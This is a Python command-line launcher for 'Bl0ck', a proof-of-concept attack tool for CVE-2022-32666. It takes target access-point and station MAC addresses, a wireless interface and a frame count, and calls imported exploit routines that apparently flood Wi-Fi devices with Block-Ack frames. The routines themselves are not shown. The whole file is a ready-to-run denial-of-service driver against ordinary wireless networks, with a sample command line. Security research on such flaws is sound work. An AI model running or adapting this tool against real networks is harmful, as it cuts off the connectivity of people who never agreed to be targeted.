#!/usr/bin/env python3
import os
import re
from exploits.BAR_BA import BARorBA_exploit
from exploits.BAR_SC import BAR_SC_exploit
import argparse

"""
Bl0ck attacks PoC tool: CVE-2022-32666
Authors: Efstratios Chatzoglou, Vyron Kampourakis
License: MIT
Copyright 2023
"""

#sudo python3 Bl0ck.py --sta MAC --ap MAC --wnic wlan0 --attack BA --num 100 --random 0

def is_valid(str):
  regex = ("^([0-9A-Fa-f]{2}[:-])" +"{5}([0-9A-Fa-f]{2})|" +"([0-9a-fA-F]{4}\\." +"[0-9a-fA-F]{4}\\." +"[0-9a-fA-F]{4})$")
  match = re.compile(regex)
  if (str == None):
    return False
  if(re.search(match, str)):
    return True
  else:
    return False

try:
    print('''
  ____  _  ___       _    
 | __ )| |/ _ \  ___| | __                    __
 |  _ \| | | | |/ __| |/ /                  .'  '.
 | |_) | | |_| | (__|   <                  | STOP |
 |____/|_|\___/ \___|_|\_\                  '.__.'
                                              ||
                                              ||
                                              ||
                                            \\||///
                                         ^^^^^^^^^^^^^
''')
    print('- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - ')

    parser = argparse.ArgumentParser()
    parser.add_argument("--sta", "-c", help="Target STA MAC address: AA:BB:CC:DD:EE:FF")
    parser.add_argument("--ap", "-b", help="Target AP MAC address: AA:BB:CC:DD:EE:FF")
    parser.add_argument("--wnic", "-i", help="Wireless interface: wlan0")
    parser.add_argument("--attack", "-a", help="Attack choice: BAR (Block-Ack Request), BA (Block-Ack) or BARS (Block-Ack Request special case)")
    parser.add_argument("--num", "-n", help="Number of concurrent frames to send: between 1 to 3000")
    parser.add_argument("--rand", "-r", help="Enable/Disable the usage of random source MAC address, overwrites the --sta/-c argument: 0 (disable) or 1 (enable)")
    parser.add_argument("--frames", "-f", help="Number of frames to send to the targeted AP: e.g., 100. If 0 was given, the attack with continue indefinitely.")
    parser.add_argument("--verbose", "-v", help="Enable/Disable verbose messages of Scapy: 0 (disable) and 1 (enable)")
    args = parser.parse_args()

    if not any(vars(args).values()):
        print ("Usage: sudo python3 Bl0ck.py --sta MAC --ap MAC --wnic wlan0 --attack BA --num 100 --random")
        os._exit(0)

    if os.geteuid() != 0:
        print("Root is needed!")
        os._exit(0)

    if not (is_valid(args.ap)):
        print("AP address is not a valid MAC address")
        os._exit(0)
    elif not (is_valid(args.sta)):
        print("STA address is not a valid MAC address")
        os._exit(0)

    if args.attack != "BA" and args.attack != "BAR" and args.attack != "BARS":
        print("Attack choice is wrong")
        os._exit(0)

    if int(args.num) < 0 or int(args.num) > 3000:
        print("Number of frames are too huge or negative. Consider giving a value between 1 and 3000.")
        os._exit(0)

    if int(args.rand) != 1 and int(args.rand) != 0:
        print("Random argument got wrong value")
        os._exit(0)

    if not(int(args.frames) >= 0):
        print("Frames value must be a positive number or 0")
        os._exit(0)

    if int(args.verbose) != 1 and int(args.verbose) != 0:
        print("Verbose argument got wrong value")
        os._exit(0)

    targeted_AP = args.ap
    targeted_STA = args.sta
    WNIC = args.wnic
    attack = args.attack
    numOfConcurrentFrames = args.num
    randomMAC = args.rand
    stopAfter = args.frames
    verboseMessages = args.verbose


    if attack == "BAR":
        #Choose subframe
        BARorBA_exploit(targeted_AP, targeted_STA, WNIC, int(numOfConcurrentFrames), 8, int(stopAfter), int(randomMAC), int(verboseMessages))
    elif attack == "BA":
        #Choose subframe
        BARorBA_exploit(targeted_AP, targeted_STA, WNIC, int(numOfConcurrentFrames), 9, int(stopAfter), int(randomMAC), int(verboseMessages))
    elif attack == "BARS":
        BAR_SC_exploit(targeted_AP, targeted_STA, WNIC, int(numOfConcurrentFrames), int(stopAfter), int(randomMAC), int(verboseMessages))
           
except Exception as err:
    # output error, and return with an error code
    print (str(err))
